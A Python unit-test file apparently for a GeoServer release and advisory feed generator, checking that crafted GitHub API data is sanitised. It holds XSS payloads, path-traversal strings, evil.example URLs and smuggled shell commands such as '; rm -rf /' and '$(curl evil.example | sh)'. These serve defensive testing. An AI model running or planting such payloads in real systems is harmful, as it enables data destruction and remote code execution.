"""Hostile-input tests: crafted API data must produce a clean feed that passes the
independent validator, or fail the run. It must never be skipped silently."""

import json
import sys
import unittest
from datetime import datetime, timezone
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "scripts"))

import check_versions as cv  # noqa: E402
import validate_feed  # noqa: E402
from test_check_versions import UTC, no_blog, raw_advisory, raw_release, real_releases, releases_from  # noqa: E402

NOW = datetime(2026, 10, 8, 6, 0, 0, tzinfo=UTC)

FORBIDDEN_TEXT = ("javascript:", "vbscript:", "data:", "onerror", "<script")
FORBIDDEN_CHARS = "  ‪‫‬‭‮​‌‍‎‏⁦⁧⁨⁩﻿\x00"


def ghsa(n):
    letters = "abcdefghijklmnopqrstuvwxyz0123456789"
    return "GHSA-" + "-".join(
        "".join(letters[(n // 36 ** k + i) % 36] for k in range(4)) for i in range(3)
    )


def generate(raw_advisories, releases=None):
    log = []
    feed = cv.build_feed(real_releases() if releases is None else releases, raw_advisories, no_blog, None, NOW, log.append)
    text = cv.serialize(feed, log.append)
    return feed, text, log


class HostileCase(unittest.TestCase):
    def assert_clean(self, feed, text):
        self.assertEqual([], validate_feed.validate_text(text.encode("utf-8")))
        for char in "<>&" + FORBIDDEN_CHARS:
            self.assertNotIn(char, text, repr(char))
        self.assertFalse(text.startswith("﻿"))
        document = json.loads(text)
        strings = [value for _, value in validate_feed.each_string(document)]
        for value in strings:
            lowered = value.lower()
            for bad in FORBIDDEN_TEXT:
                self.assertNotIn(bad, lowered, bad)
            self.assertFalse(any(ord(ch) < 32 for ch in value))
            self.assertFalse(any(0x7F <= ord(ch) <= 0x9F for ch in value))
        for advisory in document["advisories"]:
            for char in "<>":
                self.assertNotIn(char, advisory["summary"])


class SummaryTest(HostileCase):
    SUMMARIES = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)",
        "JaVaScRiPt:alert(1) and vbscript:msgbox(1) and data:text/html,x",
        "[click me](javascript:alert(1)) and ![pic](data:image/png;base64,AAAA)",
        "&lt;script&gt;alert(1)&lt;/script&gt;",
        "&#106;avascript:alert(1)",
        "&#x6a;avascript&colon;alert(1) &amp;lt;script&amp;gt;",
        "java\tscript:alert(1) java\nscript:alert(1)",
        "jajavascript:vascript:alert(1)",
        "<<script>>alert(1)<</script>>",
        "<svg/onload=alert(1)>",
        '<a href="javascript:alert(1)">x</a> <b>bold</b>',
        "unterminated <script src=//evil",
        "**bold** `code` ~~gone~~ # heading > quote",
        "‮gnirts‬ ⁦x⁩ ​zero‍width",
    ]

    def test_every_summary_is_cleaned_and_the_advisory_is_kept(self):
        raws = [raw_advisory(ghsa(i), summary=s) for i, s in enumerate(self.SUMMARIES)]
        feed, text, _ = generate(raws)
        self.assert_clean(feed, text)
        self.assertEqual({r["ghsa_id"] for r in raws}, {a["ghsa_id"] for a in feed["advisories"]})

    def test_cleaning_is_idempotent_for_text_without_entities(self):
        for summary in self.SUMMARIES:
            if "&" in summary:
                continue  # entities are decoded once, by design
            once = cv.clean_text(summary, 500)
            self.assertEqual(once, cv.clean_text(once, 500), summary)

    def test_markup_is_removed_but_text_is_kept(self):
        self.assertEqual("alert(1)", cv.clean_text("<script>alert(1)</script>"))
        self.assertEqual("click me", cv.clean_text("[click me](javascript:alert(1))"))
        self.assertEqual("Improper ENTITY_RESOLUTION_ALLOWLIST URI validation in XML Processing (SSRF)",
                         cv.clean_text("Improper ENTITY_RESOLUTION_ALLOWLIST URI validation in XML Processing (SSRF)"))
        self.assertEqual("Tom & Jerry", cv.clean_text("Tom &amp; Jerry"))

    def test_bare_placeholders_keep_their_word_but_real_markup_is_removed(self):
        keep = {
            "Unsecured WMS dynamic styling sld=<url> parameter": "Unsecured WMS dynamic styling sld=url parameter",
            "path <file> and <my-tag> and <URL>": "path file and my-tag and URL",
            "&lt;url&gt; decoded once": "url decoded once",
            "<<url>>": "url",
            "<url></url>": "url",
        }
        for raw, expected in keep.items():
            self.assertEqual(expected, cv.clean_text(raw), raw)
        gone = {
            "<script>alert(1)</script>": "alert(1)",
            "<img src=x onerror=alert(1)>": "",
            "<svg/onload=alert(1)>": "",
            "<a href=x>link</a> <b>bold</b>": "link bold",
            "<url onclick=alert(1)>": "",
            "<url/>": "",
            "<marquee>x</marquee> <blink>y</blink>": "x y",
            "<javascript:alert(1)>": "",
            "<div><span>text</span></div>": "text",
            "<style>p{}</style>": "p{}",
        }
        for raw, expected in gone.items():
            self.assertEqual(expected, cv.clean_text(raw), raw)

    def test_a_placeholder_word_cannot_assemble_a_script_scheme(self):
        for raw in ("<javascript>:alert(1)", "<vbscript>:x", "<data>:text/html", "java<x>script:alert(1)"):
            cleaned = cv.clean_text(raw)
            self.assertNotIn("javascript:", cleaned.lower(), raw)
            self.assertNotIn("vbscript:", cleaned.lower(), raw)
            self.assertNotIn("data:", cleaned.lower(), raw)
            self.assertNotIn("<", cleaned)
            self.assertNotIn(">", cleaned)

    def test_entities_are_decoded_only_once(self):
        self.assertEqual("&lt;b&gt;", cv.clean_text("&amp;lt;b&amp;gt;"))

    def test_control_and_invisible_characters(self):
        raw = "a\rb\nc\x00d\te f‮g​h﻿i\x7f\x85j"
        self.assertEqual("a b cd e fghi j", cv.clean_text(raw))

    def test_unicode_is_normalised_and_collapsed(self):
        self.assertEqual("é x", cv.clean_text("é      x"))

    def test_a_huge_summary_is_truncated(self):
        feed, text, _ = generate([raw_advisory(summary="word " * 20000)])
        self.assertLessEqual(len(feed["advisories"][0]["summary"]), cv.MAX_SUMMARY)
        self.assert_clean(feed, text)

    def test_truncation_never_splits_a_pair(self):
        summary = "x" * 499 + "\U0001F600" * 5
        cleaned = cv.clean_text(summary, 500)
        self.assertLessEqual(len(cleaned), 500)
        cleaned.encode("utf-8")  # raises on a lone surrogate

    def test_lone_surrogates_are_removed(self):
        self.assertEqual("ab", cv.clean_text("a\ud800b"))

    def test_wrong_type_is_neutralised_and_the_advisory_is_kept(self):
        for value in (5, None, {"a": 1}, ["x"], True, cv.POISON):
            logged = []
            advisory = cv.transform_advisory(raw_advisory(summary=value), log=logged.append)
            self.assertEqual(cv.NO_SUMMARY, advisory["summary"], repr(value))
            self.assertTrue(any("summary unreadable" in m for m in logged))
            feed, text, _ = generate([raw_advisory(summary=value)])
            self.assert_clean(feed, text)
            self.assertEqual(1, len(feed["advisories"]))


class IdentifierTest(HostileCase):
    def test_unidentifiable_advisories_become_one_placeholder_and_are_logged(self):
        for bad in (
            "GHSA-xxxx-xxxx-xxxx/../../x",
            'GHSA-"a"-bbbb-cccc',
            "GHSA-ab d-efgh-ijkl",
            "GHSA-ABCD-EFGH-IJKL",
            "GHSA-abcd-efgh-ijkl\n",
            "",
            5,
            None,
            cv.POISON,
        ):
            feed, text, logged = generate([raw_advisory(ghsa=bad), raw_advisory("GHSA-aaaa-aaaa-aaaa")])
            self.assertEqual(
                sorted([cv.UNREADABLE_ID, "GHSA-aaaa-aaaa-aaaa"]), sorted(a["ghsa_id"] for a in feed["advisories"]), repr(bad)
            )
            self.assert_clean(feed, text)
            self.assertNotIn("../..", text)
            message = next(m for m in logged if "advisory #0" in m)
            self.assertTrue(message.startswith("WARNING "))
            self.assertTrue(message.isascii())
            self.assertNotIn("\n", message)

    def test_many_unidentifiable_advisories_share_one_placeholder(self):
        raws = ["text", 5, None, ["x"], {"ghsa_id": "nope"}, raw_advisory("GHSA-aaaa-aaaa-aaaa")]
        feed, text, _ = generate(raws)
        placeholder = [a for a in feed["advisories"] if a["ghsa_id"] == cv.UNREADABLE_ID]
        self.assertEqual(1, len(placeholder))
        self.assertIn("5 security advisories could not be read", placeholder[0]["summary"])
        self.assertEqual("high", placeholder[0]["severity"])
        self.assertEqual([""], placeholder[0]["vulnerable_versions"])
        self.assert_clean(feed, text)
    def test_bad_cve_ids_are_omitted_and_the_advisory_is_kept(self):
        for bad in ("<b>CVE-2026-0001</b>", "CVE-26-1", "cve-2026-00000", 5, ["CVE-2026-00000"], "CVE-2026-00000 "):
            advisory = cv.transform_advisory(raw_advisory(cve_id=bad))
            self.assertNotIn("cve_id", advisory, repr(bad))
            feed, text, _ = generate([raw_advisory(cve_id=bad)])
            self.assert_clean(feed, text)
            self.assertEqual(1, len(feed["advisories"]))

    def test_missing_cve_id_stays_null(self):
        self.assertIsNone(cv.transform_advisory(raw_advisory(cve_id=None))["cve_id"])

    def test_unreadable_severity_is_published_as_high_for_review(self):
        for bad in ("urgent", "CRITICAL", "Critical", "", None, 3, "critical ", cv.POISON):
            logged = []
            advisory = cv.transform_advisory(raw_advisory(severity=bad, summary="Example"), log=logged.append)
            self.assertEqual("high", advisory["severity"], repr(bad))
            self.assertTrue(advisory["summary"].startswith("[Severity unreadable] "))
            self.assertTrue(any("severity" in m for m in logged))
    def test_unreadable_timestamps_are_replaced_by_the_generation_time(self):
        for bad in ("2026-01-01", "2026-01-01T00:00:00+00:00", "2026-13-45T00:00:00Z", None, 20260101, "2026-1-1T0:0:0Z", cv.POISON):
            advisory = cv.transform_advisory(
                raw_advisory(published_at=bad), stamp="2026-10-08T06:00:00Z", log=lambda m: None
            )
            self.assertEqual("2026-10-08T06:00:00Z", advisory["published_at"], repr(bad))


class RangeTest(HostileCase):
    def test_hostile_ranges_are_blanked_for_manual_review(self):
        sha = "df11a650c650ff895977c5440427c239671ee649"
        raw = raw_advisory(
            vulnerabilities=[
                {"vulnerable_version_range": "; rm -rf /"},
                {"vulnerable_version_range": "$(curl evil.example | sh)"},
                {"vulnerable_version_range": sha},
                {"vulnerable_version_range": ""},
                {"vulnerable_version_range": "x" * 500},
                {"vulnerable_version_range": "<script>"},
                {"vulnerable_version_range": "../../etc/passwd"},
                {"vulnerable_version_range": ">= 2.28.0, < 2.28.5"},
            ]
        )
        feed, text, _ = generate([raw])
        self.assert_clean(feed, text)
        self.assertEqual(["", sha, ">= 2.28.0, < 2.28.5"], feed["advisories"][0]["vulnerable_versions"])

    def test_the_plain_github_wording_is_kept_unchanged(self):
        for good in ("< 2.23.5", ">=2.24.0, <2.24.4", "3.0.0", "<= 2.26.3", ">2.23.5, <2.25.0, >=2.25.3",
                     "~2.1", "^3.0.0", "= 3.0.0", "2.0.0-beta1", "df11a650c650ff895977c5440427c239671ee649"):
            self.assertEqual(good, cv.clean_range(good))
        for bad in ("<script>", "alert(1)", "rm -rf", "~2.1 ^3.0", "1.0 || 2.0", ">=", "<>", "x.y.z"):
            self.assertEqual("", cv.clean_range(bad), bad)

    def test_a_thousand_distinct_ranges_are_published_for_manual_review(self):
        raw = raw_advisory(vulnerabilities=[{"vulnerable_version_range": f"< 1.0.{i}"} for i in range(1000)])
        feed, text, logged = generate([raw])
        self.assert_clean(feed, text)
        self.assertEqual([""], feed["advisories"][0]["vulnerable_versions"])
        self.assertTrue(any("more than 50 version ranges" in m for m in logged))
    def test_a_thousand_identical_ranges_collapse(self):
        raw = raw_advisory(vulnerabilities=[{"vulnerable_version_range": "< 2.28.5"}] * 1000)
        feed, text, _ = generate([raw])
        self.assertEqual(["< 2.28.5"], feed["advisories"][0]["vulnerable_versions"])
        self.assertIn("\\u003c 2.28.5", text)

    def test_fifty_ranges_are_allowed_and_fifty_one_are_blanked_for_review(self):
        fifty = raw_advisory(vulnerabilities=[{"vulnerable_version_range": f"< 1.0.{i}"} for i in range(50)])
        self.assertEqual(50, len(cv.transform_advisory(fifty)["vulnerable_versions"]))
        fifty_one = raw_advisory(vulnerabilities=[{"vulnerable_version_range": f"< 1.0.{i}"} for i in range(51)])
        self.assertEqual([""], cv.transform_advisory(fifty_one, log=lambda m: None)["vulnerable_versions"])
    def test_wrong_types_are_neutralised_and_the_advisory_is_kept(self):
        for vulnerabilities in ({"a": 1}, "text", 5, [5], ["x"], [None], [{"vulnerable_version_range": 5}],
                                [{"vulnerable_version_range": ["<1"]}], [{"patched_versions": 5}],
                                [{"patched_versions": {"a": 1}}], cv.POISON, [cv.POISON],
                                [{"vulnerable_version_range": cv.POISON}]):
            feed, text, _ = generate([raw_advisory(vulnerabilities=vulnerabilities)])
            self.assert_clean(feed, text)
            self.assertEqual(1, len(feed["advisories"]), repr(vulnerabilities))
    def test_a_non_object_advisory_becomes_the_placeholder(self):
        for raw in ("text", 5, None, ["x"], cv.POISON):
            advisories = cv.transform_advisories([raw], log=lambda m: None)
            self.assertEqual([cv.UNREADABLE_ID], [a["ghsa_id"] for a in advisories])
    def test_a_hostile_patched_version_is_ignored_not_published(self):
        raw = raw_advisory(vulnerabilities=[{"vulnerable_version_range": "< 3.0.1", "patched_versions": "<script>3.0.1</script>; 2.7.1.1, 99"}])
        feed, text, _ = generate([raw])
        self.assert_clean(feed, text)
        self.assertEqual({"3.0.x": "3.0.1"}, feed["advisories"][0]["patched_versions"])


class SizeAndCountTest(HostileCase):
    def test_ten_thousand_advisories_publish_the_most_important_500(self):
        severities = ("critical", "high", "medium", "low")
        raws = [raw_advisory(ghsa(i), severity=severities[i % 4]) for i in range(10000)]
        feed, text, logged = generate(raws)
        self.assertEqual(500, len(feed["advisories"]))
        self.assertEqual({"critical"}, {a["severity"] for a in feed["advisories"]})
        self.assertTrue(any("more than 500 advisories" in m for m in logged))
        self.assert_clean(feed, text)

    def test_the_placeholder_survives_the_advisory_limit(self):
        raws = ["not an advisory"] + [raw_advisory(ghsa(i), severity="critical") for i in range(600)]
        feed, text, _ = generate(raws)
        self.assertEqual(500, len(feed["advisories"]))
        self.assertIn(cv.UNREADABLE_ID, [a["ghsa_id"] for a in feed["advisories"]])
    def test_exactly_500_advisories_are_allowed(self):
        raws = [raw_advisory(ghsa(i)) for i in range(500)]
        feed, text, _ = generate(raws)
        self.assertEqual(500, len(feed["advisories"]))
        self.assert_clean(feed, text)

    def test_duplicate_advisory_ids_keep_the_first(self):
        feed, text, logged = generate([raw_advisory(summary="first"), raw_advisory(summary="second")])
        self.assertEqual(["first"], [a["summary"] for a in feed["advisories"]])
        self.assertTrue(any("duplicate id" in m for m in logged))
    def test_a_file_over_one_mebibyte_drops_the_least_important_advisories(self):
        raws = [
            raw_advisory(
                ghsa(i),
                severity="critical" if i == 0 else "low",
                summary="word " * 200,
                vulnerabilities=[{"vulnerable_version_range": "< " + "1." * 50 + str(j)} for j in range(50)],
            )
            for i in range(500)
        ]
        feed, text, logged = generate(raws)
        written = json.loads(text)
        self.assertLessEqual(len(text.encode("utf-8")), cv.MAX_FILE_BYTES)
        self.assertLess(len(written["advisories"]), 500)
        self.assertIn(ghsa(0), [a["ghsa_id"] for a in written["advisories"]])
        self.assertTrue(any("size limit" in m for m in logged))
        self.assert_clean(written, text)
    def test_more_than_100_series_publish_the_first_100(self):
        releases = releases_from([raw_release(f"{i}.0.0", "2026-01-01T00:00:00Z") for i in range(1, 102)])
        feed, text, logged = generate([], releases)
        self.assertEqual(100, len(feed["series"]))
        self.assertTrue(any("more than 100 series" in m for m in logged))


class ParseJsonTest(unittest.TestCase):
    def test_duplicate_keys_poison_only_the_object_that_has_them(self):
        self.assertIs(cv.POISON, cv.parse_api_json('{"a": 1, "a": 2}'))
        data = cv.parse_api_json('[{"ok": 1}, {"a": 1, "a": 2}, {"x": {"k": 1, "k": 1}, "y": 2}]')
        self.assertEqual({"ok": 1}, data[0])
        self.assertIs(cv.POISON, data[1])
        self.assertIs(cv.POISON, data[2]["x"])
        self.assertEqual(2, data[2]["y"])
    def test_non_finite_numbers_are_poisoned(self):
        for text in ('{"a": NaN}', '{"a": Infinity}', '{"a": -Infinity}', '{"a": 1e999}'):
            self.assertIs(cv.POISON, cv.parse_api_json(text)["a"], text)
        self.assertIs(cv.POISON, cv.parse_api_json("[NaN]")[0])
    def test_deep_nesting_is_cut_off(self):
        data = cv.parse_api_json("[" * 30 + "]" * 30)
        depth = 0
        while isinstance(data, list) and data:
            data, depth = data[0], depth + 1
        self.assertIs(cv.POISON, data)
        self.assertLessEqual(depth, cv.MAX_JSON_DEPTH)
        nested = cv.parse_api_json('{"a":' * 40 + "1" + "}" * 40)
        node, levels = nested, 1
        while isinstance(node, dict):
            node, levels = node["a"], levels + 1
        self.assertIs(cv.POISON, node)
        with self.assertRaises(cv.FeedError):
            cv.parse_api_json("[" * 100000 + "]" * 100000)
    def test_invalid_json_and_oversized_responses_are_rejected(self):
        for text in ("", "{", "[1,]", "nope"):
            with self.assertRaises(cv.FeedError, msg=text):
                cv.parse_api_json(text)
        with self.assertRaises(cv.FeedError):
            cv.parse_api_json("[" + "1," * (cv.MAX_API_BYTES // 2) + "1]")

    def test_ordinary_data_parses(self):
        self.assertEqual({"a": [1, 2.5, "x", None, True]}, cv.parse_api_json('{"a": [1, 2.5, "x", null, true]}'))


class ReleaseTest(HostileCase):
    def test_hostile_tags_are_ignored_and_never_published(self):
        hostile = ["../../evil", "v1;rm", "3.0.1\n", "٣.٠.١", "3.0.1 ", "3.0.1/../x", "<b>3.0.1</b>", "3.0.1-rc", ""]
        releases = releases_from([raw_release(tag, "2026-10-01T00:00:00Z") for tag in hostile])
        self.assertEqual([], releases)
        feed, text, _ = generate([], real_releases() + releases)
        self.assert_clean(feed, text)
        self.assertNotIn("evil", text)

    def test_release_url_is_built_from_the_tag(self):
        release = cv.parse_release(raw_release("v3.0.1", "2026-08-14T22:44:22Z"))
        self.assertEqual("https://github.com/geoserver/geoserver/releases/tag/v3.0.1", release.url)
        raw = raw_release("3.0.1", "2026-08-14T22:44:22Z")
        raw["html_url"] = "https://evil.example/\"><script>"
        self.assertEqual("https://github.com/geoserver/geoserver/releases/tag/3.0.1", cv.parse_release(raw).url)

    def test_wrong_types_fail_the_run(self):
        for raw in (
            "text",
            {"tag_name": 5, "published_at": "2026-01-01T00:00:00Z"},
            {"tag_name": "3.0.1", "published_at": 5},
            {"tag_name": "3.0.1", "published_at": "2026-01-01T00:00:00Z", "draft": "yes"},
            {"tag_name": "3.0.1", "published_at": "yesterday"},
            None,
        ):
            with self.assertRaises(cv.FeedError, msg=repr(raw)):
                cv.parse_release(raw)


class UrlAndBlogTest(unittest.TestCase):
    def test_checked_url(self):
        self.assertEqual("https://geoserver.org/a/b.html", cv.checked_url("https://geoserver.org/a/b.html"))
        for bad in (
            "http://geoserver.org/x",
            "https://evil.example/x",
            "https://geoserver.org@evil.example/x",
            "https://user:pw@geoserver.org/x",
            "https://geoserver.org/a b",
            "https://geoserver.org/a\nb",
            "https://geoserver.org.evil.example/x",
            "https://geoserver.org:8443/x",
            "https://geoserver.org/" + "a" * 500,
            "javascript:alert(1)",
            "//geoserver.org/x",
            "https://",
            5,
            None,
        ):
            self.assertIsNone(cv.checked_url(bad), repr(bad))

    def test_blog_url_is_built_from_validated_parts(self):
        url = cv.build_blog_url("2026-08-14-geoserver-3-0-1-released.md", ["announcements", "vulnerability"])
        self.assertEqual("https://geoserver.org/announcements/vulnerability/2026/08/14/geoserver-3-0-1-released.html", url)
        hostile = cv.build_blog_url("2026-08-14-geoserver-3-0-1-released.md", ["../../x", "a b", '"><script>', "evil.example"])
        self.assertEqual("https://geoserver.org/announcements/2026/08/14/geoserver-3-0-1-released.html", hostile)
        for name in ("2026-08-14-../../evil.md", "2026-08-14-a b.md", "x.md", "2026-08-14-UPPER.md", "2026-08-14-a/b.md"):
            self.assertIsNone(cv.build_blog_url(name, []), name)

    def test_reused_blog_data_is_revalidated(self):
        previous = [
            {
                "series": "3.0.x",
                "latest_version": "3.0.1",
                "blog_url": "https://evil.example/x",
                "security_flagged": True,
                "recent_releases": [
                    {"version": "3.0.0", "blog_url": "https://geoserver.org@evil.example/x", "security_flagged": True},
                    {"version": "2.28.4", "blog_url": "javascript:alert(1)", "security_flagged": True},
                ],
            },
            {
                "series": "2.28.x",
                "latest_version": "2.28.5",
                "blog_url": None,
                "security_flagged": "yes",
                "recent_releases": [{"version": "2.28.5", "blog_url": "https://geoserver.org/ok", "security_flagged": "yes"}],
            },
            "not an entry",
        ]
        looked_up = []

        def lookup(release):
            looked_up.append(release.version)
            return None

        entries = {e["series"]: e for e in cv.build_series_entries(real_releases(), lookup, previous, NOW)}
        for version in ("3.0.1", "3.0.0", "2.28.5", "2.28.4"):
            self.assertIn(version, looked_up, version)
        self.assertIsNone(entries["3.0.x"]["blog_url"])
        self.assertFalse(entries["3.0.x"]["security_flagged"])

    def test_previous_feed_with_the_wrong_shape_is_ignored(self):
        for previous in ("text", [], {"series": "x"}, {"series": [5, None, "x"]}):
            cv.build_feed(real_releases(), [], no_blog, previous, NOW)


class SerialisationTest(unittest.TestCase):
    def test_escapes_html_characters_and_round_trips(self):
        feed, text, _ = generate([raw_advisory(vulnerabilities=[{"vulnerable_version_range": ">= 1.0.0, < 2.0.0"}])])
        for char in "<>&":
            self.assertNotIn(char, text)
        self.assertEqual(">= 1.0.0, < 2.0.0", json.loads(text)["advisories"][0]["vulnerable_versions"][0])
        self.assertEqual(feed, json.loads(text))

    def test_utf8_without_bom_and_one_document(self):
        _, text, _ = generate([])
        raw = text.encode("utf-8")
        self.assertFalse(raw.startswith(b"\xef\xbb\xbf"))
        self.assertTrue(raw.endswith(b"}\n"))
        decoder = json.JSONDecoder()
        _, end = decoder.raw_decode(text)
        self.assertEqual("", text[end:].strip())

    def test_key_order_is_stable(self):
        feed, _, _ = generate([raw_advisory()])
        self.assertEqual(["source_note", "schema_version", "generated", "series", "advisories"], list(feed))
        self.assertEqual(
            ["series", "phase", "latest_version", "published_at", "release_url", "blog_url",
             "security_flagged", "synchronized_release", "recent_releases"],
            list(feed["series"][0]),
        )

    def test_non_finite_numbers_cannot_be_serialised(self):
        with self.assertRaises(ValueError):
            cv.serialize({"x": float("nan")})


class DegradeNotBlockTest(HostileCase):
    def test_hostile_json_through_the_whole_pipeline(self):
        text = """[
          {"ghsa_id": "GHSA-abcd-efgh-ijkl", "ghsa_id": "GHSA-zzzz-zzzz-zzzz"},
          {"ghsa_id": "GHSA-aaaa-aaaa-aaaa", "severity": NaN, "summary": "<b>ok</b>",
           "published_at": "2026-01-01T00:00:00Z",
           "vulnerabilities": [{"vulnerable_version_range": "< 2.28.5", "patched_versions": "2.28.5"}, {"a": 1, "a": 2}]}
        ]"""
        feed, out, logged = generate(cv.parse_api_json(text))
        self.assert_clean(feed, out)
        by_id = {a["ghsa_id"]: a for a in feed["advisories"]}
        self.assertEqual({cv.UNREADABLE_ID, "GHSA-aaaa-aaaa-aaaa"}, set(by_id))
        survivor = by_id["GHSA-aaaa-aaaa-aaaa"]
        self.assertEqual("high", survivor["severity"])
        self.assertEqual(["< 2.28.5", ""], survivor["vulnerable_versions"])
        self.assertEqual({"2.28.x": "2.28.5"}, survivor["patched_versions"])

    def test_a_malformed_release_is_skipped_and_the_rest_are_used(self):
        logged = []
        releases = cv.parse_releases(
            [raw_release("3.0.1", "2026-08-14T22:44:22Z"), {"tag_name": 5}, "text", None, {"tag_name": "3.0.0", "published_at": "soon"}],
            logged.append,
        )
        self.assertEqual(["3.0.1"], [r.version for r in releases])
        self.assertEqual(4, sum(m.startswith("WARNING release #") for m in logged))

    def test_unreadable_github_content_falls_back_to_the_previous_feed(self):
        previous = cv.build_feed(real_releases(), [raw_advisory()], no_blog, None, NOW)
        logged = []
        later = datetime(2026, 10, 9, tzinfo=UTC)
        kept = cv.build_feed(None, None, no_blog, previous, later, logged.append)
        self.assertEqual(previous["series"], kept["series"])
        self.assertEqual(previous["advisories"], kept["advisories"])
        self.assertEqual(2, sum(m.startswith("WARNING") for m in logged))
        self.assertEqual([], validate_feed.validate_text(cv.serialize(kept).encode()))

    def test_without_a_previous_feed_there_is_nothing_to_fall_back_on(self):
        with self.assertRaises(cv.FeedError):
            cv.build_feed(None, [], no_blog, None, NOW)
        with self.assertRaises(cv.FeedError):
            cv.build_feed(real_releases(), None, no_blog, None, NOW)

    def test_unreadable_response_content_returns_none_and_network_errors_still_fail(self):
        from unittest import mock
        import urllib.error

        logged = []
        with mock.patch.object(cv, "http_get", return_value="this is not json"):
            self.assertIsNone(cv.fetch_raw_advisories(logged.append))
            self.assertIsNone(cv.fetch_releases(logged.append))
        with mock.patch.object(cv, "http_get", return_value='{"not": "a list"}'):
            self.assertIsNone(cv.fetch_raw_advisories(logged.append))
        self.assertTrue(all(m.startswith("WARNING") for m in logged))
        with mock.patch.object(cv, "http_get", side_effect=urllib.error.URLError("down")):
            with self.assertRaises(urllib.error.URLError):
                cv.fetch_raw_advisories(logged.append)
        with mock.patch.object(cv, "http_get", return_value=json.dumps([raw_advisory("GHSA-aaaa-aaaa-aaaa")])):
            self.assertEqual(1, len(cv.fetch_raw_advisories(logged.append)))

    def test_a_blog_lookup_failure_leaves_the_release_unconfirmed(self):
        from unittest import mock
        import urllib.error

        logged = []
        release = cv.parse_release(raw_release("3.0.1", "2026-10-01T00:00:00Z"))
        lookup = cv.BlogLookup(NOW, logged.append)
        with mock.patch.object(cv, "http_get", side_effect=urllib.error.URLError("down")):
            self.assertIsNone(lookup(release))
        with mock.patch.object(cv, "http_get", return_value="garbage"):
            self.assertIsNone(cv.BlogLookup(NOW, logged.append)(release))
        self.assertEqual(2, sum("left unconfirmed" in m for m in logged))

    def test_warnings_become_single_line_annotations(self):
        import contextlib
        import io

        buffer = io.StringIO()
        with contextlib.redirect_stdout(buffer):
            cv.emit("WARNING advisory #0: bad id 'x\\n::error::boom' <script>")
            cv.emit("excluded GHSA-aaaa-aaaa-aaaa")
        lines = buffer.getvalue().splitlines()
        self.assertEqual(2, len(lines))
        self.assertTrue(lines[0].startswith("::warning::"))
        self.assertNotIn("<", lines[0])
        self.assertEqual("excluded GHSA-aaaa-aaaa-aaaa", lines[1])

    def run_main(self, releases, advisories, existing=None):
        import contextlib
        import io
        import tempfile
        from unittest import mock

        with tempfile.TemporaryDirectory() as directory:
            output = Path(directory) / "versions.json"
            if existing is not None:
                output.write_text(existing, encoding="utf-8")
            buffer, errors = io.StringIO(), io.StringIO()
            with mock.patch.object(cv, "OUTPUT_PATH", output), \
                    mock.patch.object(cv, "fetch_releases", side_effect=releases), \
                    mock.patch.object(cv, "fetch_raw_advisories", side_effect=advisories), \
                    mock.patch.object(cv, "BlogLookup", lambda now, log: no_blog), \
                    contextlib.redirect_stdout(buffer), contextlib.redirect_stderr(errors):
                try:
                    code = cv.main()
                except SystemExit as exit_:
                    code = exit_.code
            written = output.read_text(encoding="utf-8") if output.exists() else None
            return code, written, buffer.getvalue(), errors.getvalue()

    def test_main_publishes_a_clean_feed_despite_hostile_advisories(self):
        hostile = [raw_advisory(ghsa(i), summary=summary) for i, summary in enumerate(SummaryTest.SUMMARIES)]
        hostile += ["not an advisory", raw_advisory("GHSA-abcd-efgh-ijkl", severity="urgent", summary=5)]
        code, written, out, err = self.run_main([real_releases()], [hostile])
        self.assertIsNone(code)
        self.assertEqual([], validate_feed.validate_text(written.encode("utf-8")))
        self.assertIn("::warning::", out)
        self.assertEqual("", err)
        ids = {a["ghsa_id"] for a in json.loads(written)["advisories"]}
        self.assertIn(cv.UNREADABLE_ID, ids)
        self.assertIn("GHSA-abcd-efgh-ijkl", ids)

    def test_main_keeps_publishing_when_github_content_is_unreadable(self):
        first = cv.build_feed(real_releases(), [raw_advisory()], no_blog, None, NOW)
        existing = cv.serialize(first)
        code, written, out, _ = self.run_main([None], [None], existing)
        self.assertIsNone(code)
        self.assertEqual(existing, written)
        self.assertEqual(2, out.count("::warning::"))

    def test_main_fails_only_when_github_cannot_be_reached(self):
        import urllib.error

        code, written, _, err = self.run_main(urllib.error.URLError("down"), [[]])
        self.assertEqual(1, code)
        self.assertIsNone(written)
        self.assertIn("could not be reached", err)
        code, written, _, err = self.run_main(
            [real_releases()], urllib.error.HTTPError("https://x", 503, "unavailable", {}, None)
        )
        self.assertEqual(1, code)
        self.assertIn("HTTP 503", err)
        code, _, _, err = self.run_main([None], [None])
        self.assertEqual(1, code)
        self.assertIn("no previous feed to fall back on", err)


if __name__ == "__main__":
    unittest.main()
